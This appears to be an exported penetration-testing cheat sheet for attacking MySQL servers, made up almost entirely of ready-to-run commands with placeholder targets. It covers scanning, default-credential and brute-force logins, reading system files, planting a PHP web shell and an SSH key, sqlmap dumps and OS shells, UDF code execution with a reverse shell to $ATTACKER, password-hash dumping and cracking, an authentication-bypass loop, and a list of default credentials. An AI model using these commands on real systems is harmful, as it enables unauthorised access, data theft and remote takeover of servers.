---
id: "ln1ygaanampsiugae"
title: "mysql2"
description: ""
tags: []
order: 4
createdAt: "2026-05-30T15:44:35.318Z"
updatedAt: "2026-05-30T15:44:49.286Z"
---

## Port Discovery & Scanning
<!-- section: {"id":"2w3due3m2mpsiuqnl","order":0,"collapsed":false} -->

### w84w1tq4ompsiuqpn
```bash
nmap -sV -sC -p 3306 $TARGET
```

_Port Discovery & Scanning_

**Tags:** mysql, nmap, rustscan, recon, discovery
<!-- cmd: {"id":"w84w1tq4ompsiuqpn","language":"bash","sectionId":"2w3due3m2mpsiuqnl","tags":["mysql","nmap","rustscan","recon","discovery"]} -->

### 9sahwd0mrmpsiuqps
```bash
nmap -p 3306 --script mysql-audit,mysql-brute,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 $TARGET
```

**Tags:** mysql, nmap, rustscan, recon, discovery
<!-- cmd: {"id":"9sahwd0mrmpsiuqps","language":"bash","sectionId":"2w3due3m2mpsiuqnl","tags":["mysql","nmap","rustscan","recon","discovery"]} -->

### kxzs8ggbrmpsiuqpw
```bash
rustscan -a $TARGET -p 3306 -- -sV --script mysql-info
```

**Tags:** mysql, nmap, rustscan, recon, discovery
<!-- cmd: {"id":"kxzs8ggbrmpsiuqpw","language":"bash","sectionId":"2w3due3m2mpsiuqnl","tags":["mysql","nmap","rustscan","recon","discovery"]} -->

## Authentication & Default Credentials
<!-- section: {"id":"a37ye0hx5mpsiuqnu","order":1,"collapsed":false} -->

### 0qdrv5sshmpsiuqq8
```bash
mysql -h $TARGET -u root -p
```

_Authentication & Default Credentials_

**Tags:** mysql, default-credentials, empty-password, authentication
<!-- cmd: {"id":"0qdrv5sshmpsiuqq8","language":"bash","sectionId":"a37ye0hx5mpsiuqnu","tags":["mysql","default-credentials","empty-password","authentication"]} -->

### xqj0fldzempsiuqqd
```bash
mysql -h $TARGET -u root --password=''
```

**Tags:** mysql, default-credentials, empty-password, authentication
<!-- cmd: {"id":"xqj0fldzempsiuqqd","language":"bash","sectionId":"a37ye0hx5mpsiuqnu","tags":["mysql","default-credentials","empty-password","authentication"]} -->

### fcjj1brqlmpsiuqqg
```bash
mysql -h $TARGET -u root --password='root'
```

**Tags:** mysql, default-credentials, empty-password, authentication
<!-- cmd: {"id":"fcjj1brqlmpsiuqqg","language":"bash","sectionId":"a37ye0hx5mpsiuqnu","tags":["mysql","default-credentials","empty-password","authentication"]} -->

### 3q2bljqlimpsiuqqk
```bash
netexec mssql $TARGET -u root -p ''
```

**Tags:** mysql, default-credentials, empty-password, authentication
<!-- cmd: {"id":"3q2bljqlimpsiuqqk","language":"bash","sectionId":"a37ye0hx5mpsiuqnu","tags":["mysql","default-credentials","empty-password","authentication"]} -->

### rz80l43pzmpsiuqqn
```bash
netexec mssql $TARGET -u root -p 'root'
```

**Tags:** mysql, default-credentials, empty-password, authentication
<!-- cmd: {"id":"rz80l43pzmpsiuqqn","language":"bash","sectionId":"a37ye0hx5mpsiuqnu","tags":["mysql","default-credentials","empty-password","authentication"]} -->

### 32ddos2sampsiuqqr
```bash
nmap --script mysql-empty-password -p 3306 $TARGET
```

**Tags:** mysql, default-credentials, empty-password, authentication
<!-- cmd: {"id":"32ddos2sampsiuqqr","language":"bash","sectionId":"a37ye0hx5mpsiuqnu","tags":["mysql","default-credentials","empty-password","authentication"]} -->

## Brute Force
<!-- section: {"id":"my83e1fh0mpsiuqny","order":2,"collapsed":false} -->

### t36aj0umsmpsiuqr4
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://$TARGET -t 4
```

_Brute Force_

**Tags:** mysql, bruteforce, hydra, medusa, metasploit
<!-- cmd: {"id":"t36aj0umsmpsiuqr4","language":"bash","sectionId":"my83e1fh0mpsiuqny","tags":["mysql","bruteforce","hydra","medusa","metasploit"]} -->

### khnf76w26mpsiuqr9
```bash
hydra -L users.txt -P passwords.txt mysql://$TARGET
```

**Tags:** mysql, bruteforce, hydra, medusa, metasploit
<!-- cmd: {"id":"khnf76w26mpsiuqr9","language":"bash","sectionId":"my83e1fh0mpsiuqny","tags":["mysql","bruteforce","hydra","medusa","metasploit"]} -->

### jrkkpz03umpsiuqrc
```bash
medusa -h $TARGET -u root -P passwords.txt -M mysql
```

**Tags:** mysql, bruteforce, hydra, medusa, metasploit
<!-- cmd: {"id":"jrkkpz03umpsiuqrc","language":"bash","sectionId":"my83e1fh0mpsiuqny","tags":["mysql","bruteforce","hydra","medusa","metasploit"]} -->

### 8q7aymq54mpsiuqrg
```bash
use auxiliary/scanner/mysql/mysql_login
```

**Tags:** mysql, bruteforce, hydra, medusa, metasploit
<!-- cmd: {"id":"8q7aymq54mpsiuqrg","language":"bash","sectionId":"my83e1fh0mpsiuqny","tags":["mysql","bruteforce","hydra","medusa","metasploit"]} -->

### oagx6pibdmpsiuqrj
```bash
set RHOSTS $TARGET
```

**Tags:** mysql, bruteforce, hydra, medusa, metasploit
<!-- cmd: {"id":"oagx6pibdmpsiuqrj","language":"bash","sectionId":"my83e1fh0mpsiuqny","tags":["mysql","bruteforce","hydra","medusa","metasploit"]} -->

### uxzd8sa50mpsiuqrn
```bash
set USERNAME root
```

**Tags:** mysql, bruteforce, hydra, medusa, metasploit
<!-- cmd: {"id":"uxzd8sa50mpsiuqrn","language":"bash","sectionId":"my83e1fh0mpsiuqny","tags":["mysql","bruteforce","hydra","medusa","metasploit"]} -->

### frrm0e0knmpsiuqrr
```bash
set PASS_FILE passwords.txt
```

**Tags:** mysql, bruteforce, hydra, medusa, metasploit
<!-- cmd: {"id":"frrm0e0knmpsiuqrr","language":"bash","sectionId":"my83e1fh0mpsiuqny","tags":["mysql","bruteforce","hydra","medusa","metasploit"]} -->

### xlqlmlajumpsiuqrv
```bash
run
```

**Tags:** mysql, bruteforce, hydra, medusa, metasploit
<!-- cmd: {"id":"xlqlmlajumpsiuqrv","language":"bash","sectionId":"my83e1fh0mpsiuqny","tags":["mysql","bruteforce","hydra","medusa","metasploit"]} -->

## Enumeration (Authenticated)
<!-- section: {"id":"2pjwidgpgmpsiuqo1","order":3,"collapsed":false} -->

### xj13m4yfempsiuqs9
```bash
mysql -h $TARGET -u $USER -p'$PASS'
```

_Enumeration (Authenticated)_

**Tags:** mysql, authenticated, enumeration, users, databases
<!-- cmd: {"id":"xj13m4yfempsiuqs9","language":"bash","sectionId":"2pjwidgpgmpsiuqo1","tags":["mysql","authenticated","enumeration","users","databases"]} -->

### ad9n4a5yrmpsiuqsd
```bash
SHOW DATABASES;
```

**Tags:** mysql, authenticated, enumeration, users, databases
<!-- cmd: {"id":"ad9n4a5yrmpsiuqsd","language":"bash","sectionId":"2pjwidgpgmpsiuqo1","tags":["mysql","authenticated","enumeration","users","databases"]} -->

### nq44xtnoampsiuqsg
```bash
USE $DBNAME; SHOW TABLES;
```

**Tags:** mysql, authenticated, enumeration, users, databases
<!-- cmd: {"id":"nq44xtnoampsiuqsg","language":"bash","sectionId":"2pjwidgpgmpsiuqo1","tags":["mysql","authenticated","enumeration","users","databases"]} -->

### tqpm58xy2mpsiuqsl
```bash
SELECT * FROM $TABLE;
```

**Tags:** mysql, authenticated, enumeration, users, databases
<!-- cmd: {"id":"tqpm58xy2mpsiuqsl","language":"bash","sectionId":"2pjwidgpgmpsiuqo1","tags":["mysql","authenticated","enumeration","users","databases"]} -->

### y00rif3jumpsiuqso
```bash
SELECT user, host, password FROM mysql.user;
```

**Tags:** mysql, authenticated, enumeration, users, databases
<!-- cmd: {"id":"y00rif3jumpsiuqso","language":"bash","sectionId":"2pjwidgpgmpsiuqo1","tags":["mysql","authenticated","enumeration","users","databases"]} -->

### tw69byg1gmpsiuqss
```bash
SELECT user, host, authentication_string FROM mysql.user;
```

**Tags:** mysql, authenticated, enumeration, users, databases
<!-- cmd: {"id":"tw69byg1gmpsiuqss","language":"bash","sectionId":"2pjwidgpgmpsiuqo1","tags":["mysql","authenticated","enumeration","users","databases"]} -->

### 9k1tfdbk8mpsiuqsw
```bash
SHOW GRANTS;
```

**Tags:** mysql, authenticated, enumeration, users, databases
<!-- cmd: {"id":"9k1tfdbk8mpsiuqsw","language":"bash","sectionId":"2pjwidgpgmpsiuqo1","tags":["mysql","authenticated","enumeration","users","databases"]} -->

### o0v8ocdafmpsiuqt1
```bash
SHOW GRANTS FOR '$USER'@'%';
```

**Tags:** mysql, authenticated, enumeration, users, databases
<!-- cmd: {"id":"o0v8ocdafmpsiuqt1","language":"bash","sectionId":"2pjwidgpgmpsiuqo1","tags":["mysql","authenticated","enumeration","users","databases"]} -->

### zl2ryyes1mpsiuqt4
```bash
SHOW VARIABLES;
```

**Tags:** mysql, authenticated, enumeration, users, databases
<!-- cmd: {"id":"zl2ryyes1mpsiuqt4","language":"bash","sectionId":"2pjwidgpgmpsiuqo1","tags":["mysql","authenticated","enumeration","users","databases"]} -->

### xufkrsk0vmpsiuqt8
```bash
SHOW VARIABLES LIKE '%secure%';
```

**Tags:** mysql, authenticated, enumeration, users, databases
<!-- cmd: {"id":"xufkrsk0vmpsiuqt8","language":"bash","sectionId":"2pjwidgpgmpsiuqo1","tags":["mysql","authenticated","enumeration","users","databases"]} -->

### 47u6bvf4jmpsiuqtc
```bash
SHOW VARIABLES LIKE 'secure_file_priv';
```

**Tags:** mysql, authenticated, enumeration, users, databases
<!-- cmd: {"id":"47u6bvf4jmpsiuqtc","language":"bash","sectionId":"2pjwidgpgmpsiuqo1","tags":["mysql","authenticated","enumeration","users","databases"]} -->

## File Read via MySQL
<!-- section: {"id":"yr7pp4gsfmpsiuqo5","order":4,"collapsed":false} -->

### wihqc4f7ympsiuqtw
```bash
SELECT LOAD_FILE('/etc/passwd');
```

_File Read via MySQL_

**Tags:** mysql, file-read, load_file, privilege, exploitation
<!-- cmd: {"id":"wihqc4f7ympsiuqtw","language":"bash","sectionId":"yr7pp4gsfmpsiuqo5","tags":["mysql","file-read","load_file","privilege","exploitation"]} -->

### sf3nzgmqjmpsiuqu0
```bash
SELECT LOAD_FILE('/var/www/html/config.php');
```

**Tags:** mysql, file-read, load_file, privilege, exploitation
<!-- cmd: {"id":"sf3nzgmqjmpsiuqu0","language":"bash","sectionId":"yr7pp4gsfmpsiuqo5","tags":["mysql","file-read","load_file","privilege","exploitation"]} -->

### xe5dv9nagmpsiuqu4
```bash
SELECT super_priv FROM mysql.user WHERE user='$USER';
```

**Tags:** mysql, file-read, load_file, privilege, exploitation
<!-- cmd: {"id":"xe5dv9nagmpsiuqu4","language":"bash","sectionId":"yr7pp4gsfmpsiuqo5","tags":["mysql","file-read","load_file","privilege","exploitation"]} -->

### jy897qlbrmpsiuqu7
```bash
SHOW GRANTS;
```

**Tags:** mysql, file-read, load_file, privilege, exploitation
<!-- cmd: {"id":"jy897qlbrmpsiuqu7","language":"bash","sectionId":"yr7pp4gsfmpsiuqo5","tags":["mysql","file-read","load_file","privilege","exploitation"]} -->

### ctmrafnfmmpsiuqub
```bash
mysql -h $TARGET -u $USER -p'$PASS' -e "SELECT LOAD_FILE('/etc/passwd');"
```

**Tags:** mysql, file-read, load_file, privilege, exploitation
<!-- cmd: {"id":"ctmrafnfmmpsiuqub","language":"bash","sectionId":"yr7pp4gsfmpsiuqo5","tags":["mysql","file-read","load_file","privilege","exploitation"]} -->

## File Write via MySQL
<!-- section: {"id":"bpmnrt7srmpsiuqo8","order":5,"collapsed":false} -->

### a1chya45gmpsiuquo
```bash
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
```

_File Write via MySQL_

**Tags:** mysql, file-write, webshell, outfile, exploitation, rce
<!-- cmd: {"id":"a1chya45gmpsiuquo","language":"bash","sectionId":"bpmnrt7srmpsiuqo8","tags":["mysql","file-write","webshell","outfile","exploitation","rce"]} -->

### ay4c8157lmpsiuqus
```bash
SELECT "<?php system($_GET['cmd']); ?>" INTO DUMPFILE '/var/www/html/shell.php';
```

**Tags:** mysql, file-write, webshell, outfile, exploitation, rce
<!-- cmd: {"id":"ay4c8157lmpsiuqus","language":"bash","sectionId":"bpmnrt7srmpsiuqo8","tags":["mysql","file-write","webshell","outfile","exploitation","rce"]} -->

### lz6w78n9ompsiuquw
```bash
SELECT "ssh-rsa AAAAB3..." INTO OUTFILE '/root/.ssh/authorized_keys';
```

**Tags:** mysql, file-write, webshell, outfile, exploitation, rce
<!-- cmd: {"id":"lz6w78n9ompsiuquw","language":"bash","sectionId":"bpmnrt7srmpsiuqo8","tags":["mysql","file-write","webshell","outfile","exploitation","rce"]} -->

### x9ojfpjtjmpsiuqv0
```bash
SHOW VARIABLES LIKE 'secure_file_priv';
```

**Tags:** mysql, file-write, webshell, outfile, exploitation, rce
<!-- cmd: {"id":"x9ojfpjtjmpsiuqv0","language":"bash","sectionId":"bpmnrt7srmpsiuqo8","tags":["mysql","file-write","webshell","outfile","exploitation","rce"]} -->

## SQL Injection via sqlmap
<!-- section: {"id":"b30su8i72mpsiuqod","order":6,"collapsed":false} -->

### ynkwbybmxmpsiuqv9
```bash
sqlmap -u "http://$TARGET/page.php?id=1" --dbms=mysql --batch --dbs
```

_SQL Injection via sqlmap_

**Tags:** mysql, sqli, sqlmap, exploitation, database
<!-- cmd: {"id":"ynkwbybmxmpsiuqv9","language":"bash","sectionId":"b30su8i72mpsiuqod","tags":["mysql","sqli","sqlmap","exploitation","database"]} -->

### altvb78pxmpsiuqvd
```bash
sqlmap -u "http://$TARGET/login" --data "user=admin&pass=test" --batch --dbms=mysql
```

**Tags:** mysql, sqli, sqlmap, exploitation, database
<!-- cmd: {"id":"altvb78pxmpsiuqvd","language":"bash","sectionId":"b30su8i72mpsiuqod","tags":["mysql","sqli","sqlmap","exploitation","database"]} -->

### 47dgxislrmpsiuqvg
```bash
sqlmap -r request.txt --batch --dbms=mysql --dbs
```

**Tags:** mysql, sqli, sqlmap, exploitation, database
<!-- cmd: {"id":"47dgxislrmpsiuqvg","language":"bash","sectionId":"b30su8i72mpsiuqod","tags":["mysql","sqli","sqlmap","exploitation","database"]} -->

### ph3sse3bkmpsiuqvl
```bash
sqlmap -u "http://$TARGET/page.php?id=1" --batch -D $DBNAME --tables
```

**Tags:** mysql, sqli, sqlmap, exploitation, database
<!-- cmd: {"id":"ph3sse3bkmpsiuqvl","language":"bash","sectionId":"b30su8i72mpsiuqod","tags":["mysql","sqli","sqlmap","exploitation","database"]} -->

### wb95sbam7mpsiuqvp
```bash
sqlmap -u "http://$TARGET/page.php?id=1" --batch -D $DBNAME -T $TABLE --dump
```

**Tags:** mysql, sqli, sqlmap, exploitation, database
<!-- cmd: {"id":"wb95sbam7mpsiuqvp","language":"bash","sectionId":"b30su8i72mpsiuqod","tags":["mysql","sqli","sqlmap","exploitation","database"]} -->

### 8raq3tb86mpsiuqvs
```bash
sqlmap -u "http://$TARGET/page.php?id=1" --batch --os-shell
```

**Tags:** mysql, sqli, sqlmap, exploitation, database
<!-- cmd: {"id":"8raq3tb86mpsiuqvs","language":"bash","sectionId":"b30su8i72mpsiuqod","tags":["mysql","sqli","sqlmap","exploitation","database"]} -->

### 85l7tv00zmpsiuqvx
```bash
sqlmap -u "http://$TARGET/page.php?id=1" --batch --file-read=/etc/passwd
```

**Tags:** mysql, sqli, sqlmap, exploitation, database
<!-- cmd: {"id":"85l7tv00zmpsiuqvx","language":"bash","sectionId":"b30su8i72mpsiuqod","tags":["mysql","sqli","sqlmap","exploitation","database"]} -->

### ui0ohn4pdmpsiuqw0
```bash
sqlmap -u "http://$TARGET/page.php?id=1" --batch --file-write=shell.php --file-dest=/var/www/html/shell.php
```

**Tags:** mysql, sqli, sqlmap, exploitation, database
<!-- cmd: {"id":"ui0ohn4pdmpsiuqw0","language":"bash","sectionId":"b30su8i72mpsiuqod","tags":["mysql","sqli","sqlmap","exploitation","database"]} -->

## UDF (User-Defined Function) Code Execution
<!-- section: {"id":"jgarmor7xmpsiuqog","order":7,"collapsed":false} -->

### eavyg8s5ampsiuqwh
```bash
SELECT @@version_compile_os, @@version_compile_machine;
```

_UDF (User-Defined Function) Code Execution_

**Tags:** mysql, udf, rce, exploitation, code-execution
<!-- cmd: {"id":"eavyg8s5ampsiuqwh","language":"bash","sectionId":"jgarmor7xmpsiuqog","tags":["mysql","udf","rce","exploitation","code-execution"]} -->

### 8tzlph9rfmpsiuqwm
```bash
SELECT @@plugin_dir;
```

**Tags:** mysql, udf, rce, exploitation, code-execution
<!-- cmd: {"id":"8tzlph9rfmpsiuqwm","language":"bash","sectionId":"jgarmor7xmpsiuqog","tags":["mysql","udf","rce","exploitation","code-execution"]} -->

### q0yg0gfdzmpsiuqwq
```bash
use exploit/multi/handler
```

**Tags:** mysql, udf, rce, exploitation, code-execution
<!-- cmd: {"id":"q0yg0gfdzmpsiuqwq","language":"bash","sectionId":"jgarmor7xmpsiuqog","tags":["mysql","udf","rce","exploitation","code-execution"]} -->

### xms1r7m9ympsiuqwu
```bash
use exploit/linux/mysql/mysql_udf_payload (metasploit)
```

**Tags:** mysql, udf, rce, exploitation, code-execution
<!-- cmd: {"id":"xms1r7m9ympsiuqwu","language":"bash","sectionId":"jgarmor7xmpsiuqog","tags":["mysql","udf","rce","exploitation","code-execution"]} -->

### w7inqj2s0mpsiuqwx
```bash
mysql -h $TARGET -u root -p'$PASS'
```

**Tags:** mysql, udf, rce, exploitation, code-execution
<!-- cmd: {"id":"w7inqj2s0mpsiuqwx","language":"bash","sectionId":"jgarmor7xmpsiuqog","tags":["mysql","udf","rce","exploitation","code-execution"]} -->

### 2lz6iw6jzmpsiuqx2
```bash
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';
```

**Tags:** mysql, udf, rce, exploitation, code-execution
<!-- cmd: {"id":"2lz6iw6jzmpsiuqx2","language":"bash","sectionId":"jgarmor7xmpsiuqog","tags":["mysql","udf","rce","exploitation","code-execution"]} -->

### hlxyelau0mpsiuqx5
```bash
SELECT sys_exec('id > /tmp/output');
```

**Tags:** mysql, udf, rce, exploitation, code-execution
<!-- cmd: {"id":"hlxyelau0mpsiuqx5","language":"bash","sectionId":"jgarmor7xmpsiuqog","tags":["mysql","udf","rce","exploitation","code-execution"]} -->

### muqvybvw8mpsiuqx8
```bash
SELECT sys_exec('bash -i >& /dev/tcp/$ATTACKER/4444 0>&1');
```

**Tags:** mysql, udf, rce, exploitation, code-execution
<!-- cmd: {"id":"muqvybvw8mpsiuqx8","language":"bash","sectionId":"jgarmor7xmpsiuqog","tags":["mysql","udf","rce","exploitation","code-execution"]} -->

## Password Hash Extraction & Cracking
<!-- section: {"id":"c1wtm4g61mpsiuqok","order":8,"collapsed":false} -->

### dvs41pr1cmpsiuqxi
```bash
mysql -h $TARGET -u root -p'$PASS' -e "SELECT user, authentication_string FROM mysql.user;"
```

_Password Hash Extraction & Cracking_

**Tags:** mysql, password-hashes, hashcat, john, credential-access
<!-- cmd: {"id":"dvs41pr1cmpsiuqxi","language":"bash","sectionId":"c1wtm4g61mpsiuqok","tags":["mysql","password-hashes","hashcat","john","credential-access"]} -->

### ecrxa11y0mpsiuqxm
```bash
mysql -h $TARGET -u root -p'$PASS' -e "SELECT user, password FROM mysql.user;"
```

**Tags:** mysql, password-hashes, hashcat, john, credential-access
<!-- cmd: {"id":"ecrxa11y0mpsiuqxm","language":"bash","sectionId":"c1wtm4g61mpsiuqok","tags":["mysql","password-hashes","hashcat","john","credential-access"]} -->

### j8l1z6z9smpsiuqxq
```bash
nmap --script mysql-dump-hashes -p 3306 $TARGET --script-args username=root,password=''
```

**Tags:** mysql, password-hashes, hashcat, john, credential-access
<!-- cmd: {"id":"j8l1z6z9smpsiuqxq","language":"bash","sectionId":"c1wtm4g61mpsiuqok","tags":["mysql","password-hashes","hashcat","john","credential-access"]} -->

### p1u6yl2jqmpsiuqxt
```bash
use auxiliary/scanner/mysql/mysql_hashdump
```

**Tags:** mysql, password-hashes, hashcat, john, credential-access
<!-- cmd: {"id":"p1u6yl2jqmpsiuqxt","language":"bash","sectionId":"c1wtm4g61mpsiuqok","tags":["mysql","password-hashes","hashcat","john","credential-access"]} -->

### 9h0h8we2ampsiuqxx
```bash
set RHOSTS $TARGET
```

**Tags:** mysql, password-hashes, hashcat, john, credential-access
<!-- cmd: {"id":"9h0h8we2ampsiuqxx","language":"bash","sectionId":"c1wtm4g61mpsiuqok","tags":["mysql","password-hashes","hashcat","john","credential-access"]} -->

### z5kngwcgpmpsiuqy0
```bash
set USERNAME root
```

**Tags:** mysql, password-hashes, hashcat, john, credential-access
<!-- cmd: {"id":"z5kngwcgpmpsiuqy0","language":"bash","sectionId":"c1wtm4g61mpsiuqok","tags":["mysql","password-hashes","hashcat","john","credential-access"]} -->

### tl380s6aampsiuqy4
```bash
set PASSWORD ''
```

**Tags:** mysql, password-hashes, hashcat, john, credential-access
<!-- cmd: {"id":"tl380s6aampsiuqy4","language":"bash","sectionId":"c1wtm4g61mpsiuqok","tags":["mysql","password-hashes","hashcat","john","credential-access"]} -->

### 2c1x20bfumpsiuqy8
```bash
run
```

**Tags:** mysql, password-hashes, hashcat, john, credential-access
<!-- cmd: {"id":"2c1x20bfumpsiuqy8","language":"bash","sectionId":"c1wtm4g61mpsiuqok","tags":["mysql","password-hashes","hashcat","john","credential-access"]} -->

### zxrk5rfz3mpsiuqyb
```bash
hashcat -m 300 hashes.txt /usr/share/wordlists/rockyou.txt
```

**Tags:** mysql, password-hashes, hashcat, john, credential-access
<!-- cmd: {"id":"zxrk5rfz3mpsiuqyb","language":"bash","sectionId":"c1wtm4g61mpsiuqok","tags":["mysql","password-hashes","hashcat","john","credential-access"]} -->

### ypxbveon6mpsiuqyf
```bash
john --format=mysql hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Tags:** mysql, password-hashes, hashcat, john, credential-access
<!-- cmd: {"id":"ypxbveon6mpsiuqyf","language":"bash","sectionId":"c1wtm4g61mpsiuqok","tags":["mysql","password-hashes","hashcat","john","credential-access"]} -->

### 62cqc5cwcmpsiuqyj
```bash
hashcat -m 300 hashes.txt /usr/share/wordlists/rockyou.txt
```

**Tags:** mysql, password-hashes, hashcat, john, credential-access
<!-- cmd: {"id":"62cqc5cwcmpsiuqyj","language":"bash","sectionId":"c1wtm4g61mpsiuqok","tags":["mysql","password-hashes","hashcat","john","credential-access"]} -->

## MySQL via Metasploit
<!-- section: {"id":"pqx4ayzaumpsiuqoo","order":9,"collapsed":false} -->

### cqmllaj3cmpsiuqz0
```bash
use auxiliary/scanner/mysql/mysql_login
```

_MySQL via Metasploit_

**Tags:** mysql, metasploit, exploitation, enumeration
<!-- cmd: {"id":"cqmllaj3cmpsiuqz0","language":"bash","sectionId":"pqx4ayzaumpsiuqoo","tags":["mysql","metasploit","exploitation","enumeration"]} -->

### 1qow2siq7mpsiuqz4
```bash
use auxiliary/scanner/mysql/mysql_hashdump
```

**Tags:** mysql, metasploit, exploitation, enumeration
<!-- cmd: {"id":"1qow2siq7mpsiuqz4","language":"bash","sectionId":"pqx4ayzaumpsiuqoo","tags":["mysql","metasploit","exploitation","enumeration"]} -->

### pkj8o3ovmmpsiuqz8
```bash
use auxiliary/scanner/mysql/mysql_version
```

**Tags:** mysql, metasploit, exploitation, enumeration
<!-- cmd: {"id":"pkj8o3ovmmpsiuqz8","language":"bash","sectionId":"pqx4ayzaumpsiuqoo","tags":["mysql","metasploit","exploitation","enumeration"]} -->

### wa6du95campsiuqzb
```bash
use exploit/linux/mysql/mysql_udf_payload
```

**Tags:** mysql, metasploit, exploitation, enumeration
<!-- cmd: {"id":"wa6du95campsiuqzb","language":"bash","sectionId":"pqx4ayzaumpsiuqoo","tags":["mysql","metasploit","exploitation","enumeration"]} -->

### omm7mvz7impsiuqzf
```bash
use exploit/multi/mysql/mysql_udf_payload
```

**Tags:** mysql, metasploit, exploitation, enumeration
<!-- cmd: {"id":"omm7mvz7impsiuqzf","language":"bash","sectionId":"pqx4ayzaumpsiuqoo","tags":["mysql","metasploit","exploitation","enumeration"]} -->

## CVE-2012-2122 — Auth Bypass
<!-- section: {"id":"4ftybcbdlmpsiuqor","order":10,"collapsed":false} -->

### 0e5g2lt0pmpsiuqzs
```bash
nmap --script mysql-vuln-cve2012-2122 -p 3306 $TARGET
```

_CVE-2012-2122 — Auth Bypass Authentication bypass via timing attack (MySQL 5.1.x, 5.5.x)._

**Tags:** mysql, cve-2012-2122, auth-bypass, vulnerability
<!-- cmd: {"id":"0e5g2lt0pmpsiuqzs","language":"bash","sectionId":"4ftybcbdlmpsiuqor","tags":["mysql","cve-2012-2122","auth-bypass","vulnerability"]} -->

### 0s5s1ivn4mpsiuqzv
```bash
for i in {1..1000}; do mysql -h $TARGET -u root --password=wrong 2>/dev/null && break; done
```

**Tags:** mysql, cve-2012-2122, auth-bypass, vulnerability
<!-- cmd: {"id":"0s5s1ivn4mpsiuqzv","language":"bash","sectionId":"4ftybcbdlmpsiuqor","tags":["mysql","cve-2012-2122","auth-bypass","vulnerability"]} -->

## NSE Scripts — Comprehensive Scan
<!-- section: {"id":"ekhdbwgujmpsiuqou","order":11,"collapsed":false} -->

### wiguu3xjnmpsiur08
```bash
nmap -p 3306 --script "mysql-*" $TARGET
```

_NSE Scripts — Comprehensive Scan_

**Tags:** mysql, nmap, nse, comprehensive
<!-- cmd: {"id":"wiguu3xjnmpsiur08","language":"bash","sectionId":"ekhdbwgujmpsiuqou","tags":["mysql","nmap","nse","comprehensive"]} -->

### hcesj66xnmpsiur0d
```bash
nmap -p 3306 --script mysql-audit,mysql-brute,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables $TARGET
```

**Tags:** mysql, nmap, nse, comprehensive
<!-- cmd: {"id":"hcesj66xnmpsiur0d","language":"bash","sectionId":"ekhdbwgujmpsiuqou","tags":["mysql","nmap","nse","comprehensive"]} -->

## Common Misconfigurations
<!-- section: {"id":"qfq3oygcsmpsiuqoy","order":12,"collapsed":false} -->

### wuj4kdo7pmpsiur0m
```bash
mysql -h $TARGET -u root -p''
```

_Common Misconfigurations_

**Tags:** mysql, misconfiguration, empty-password, remote-root, anonymous
<!-- cmd: {"id":"wuj4kdo7pmpsiur0m","language":"bash","sectionId":"qfq3oygcsmpsiuqoy","tags":["mysql","misconfiguration","empty-password","remote-root","anonymous"]} -->

### fzen72c5rmpsiur0q
```bash
nmap -p 3306 $TARGET
```

**Tags:** mysql, misconfiguration, empty-password, remote-root, anonymous
<!-- cmd: {"id":"fzen72c5rmpsiur0q","language":"bash","sectionId":"qfq3oygcsmpsiuqoy","tags":["mysql","misconfiguration","empty-password","remote-root","anonymous"]} -->

### fbjupa3gumpsiur0t
```bash
SELECT @@secure_file_priv;
```

**Tags:** mysql, misconfiguration, empty-password, remote-root, anonymous
<!-- cmd: {"id":"fbjupa3gumpsiur0t","language":"bash","sectionId":"qfq3oygcsmpsiuqoy","tags":["mysql","misconfiguration","empty-password","remote-root","anonymous"]} -->

### ijfwadbcmmpsiur0x
```bash
SELECT user, host FROM mysql.user WHERE user='root' AND host='%';
```

**Tags:** mysql, misconfiguration, empty-password, remote-root, anonymous
<!-- cmd: {"id":"ijfwadbcmmpsiur0x","language":"bash","sectionId":"qfq3oygcsmpsiuqoy","tags":["mysql","misconfiguration","empty-password","remote-root","anonymous"]} -->

### mx1fhxgh7mpsiur10
```bash
SELECT user, host FROM mysql.user WHERE user='';
```

**Tags:** mysql, misconfiguration, empty-password, remote-root, anonymous
<!-- cmd: {"id":"mx1fhxgh7mpsiur10","language":"bash","sectionId":"qfq3oygcsmpsiuqoy","tags":["mysql","misconfiguration","empty-password","remote-root","anonymous"]} -->

### cb9dy2j2ampsiur15
```bash
SELECT user, length(password) FROM mysql.user;
```

**Tags:** mysql, misconfiguration, empty-password, remote-root, anonymous
<!-- cmd: {"id":"cb9dy2j2ampsiur15","language":"bash","sectionId":"qfq3oygcsmpsiuqoy","tags":["mysql","misconfiguration","empty-password","remote-root","anonymous"]} -->

## Default Credentials
<!-- section: {"id":"uc0zaih07mpsiuqp2","order":13,"collapsed":false} -->

### 9k6t4jnoimpsiur1p
```bash
root:(empty)
```

_Default Credentials_

**Tags:** mysql, default-credentials
<!-- cmd: {"id":"9k6t4jnoimpsiur1p","language":"bash","sectionId":"uc0zaih07mpsiuqp2","tags":["mysql","default-credentials"]} -->

### u8hiz83l3mpsiur1u
```bash
root:root
```

**Tags:** mysql, default-credentials
<!-- cmd: {"id":"u8hiz83l3mpsiur1u","language":"bash","sectionId":"uc0zaih07mpsiuqp2","tags":["mysql","default-credentials"]} -->

### e2m4pmf5rmpsiur1z
```bash
root:mysql
```

**Tags:** mysql, default-credentials
<!-- cmd: {"id":"e2m4pmf5rmpsiur1z","language":"bash","sectionId":"uc0zaih07mpsiuqp2","tags":["mysql","default-credentials"]} -->

### 0zfcxduw3mpsiur22
```bash
root:password
```

**Tags:** mysql, default-credentials
<!-- cmd: {"id":"0zfcxduw3mpsiur22","language":"bash","sectionId":"uc0zaih07mpsiuqp2","tags":["mysql","default-credentials"]} -->

### k8hwaccysmpsiur26
```bash
root:toor
```

**Tags:** mysql, default-credentials
<!-- cmd: {"id":"k8hwaccysmpsiur26","language":"bash","sectionId":"uc0zaih07mpsiuqp2","tags":["mysql","default-credentials"]} -->

### 6r5ygy4hnmpsiur2b
```bash
admin:admin
```

**Tags:** mysql, default-credentials
<!-- cmd: {"id":"6r5ygy4hnmpsiur2b","language":"bash","sectionId":"uc0zaih07mpsiuqp2","tags":["mysql","default-credentials"]} -->

### e2yqy4dhumpsiur2e
```bash
mysql:mysql
```

**Tags:** mysql, default-credentials
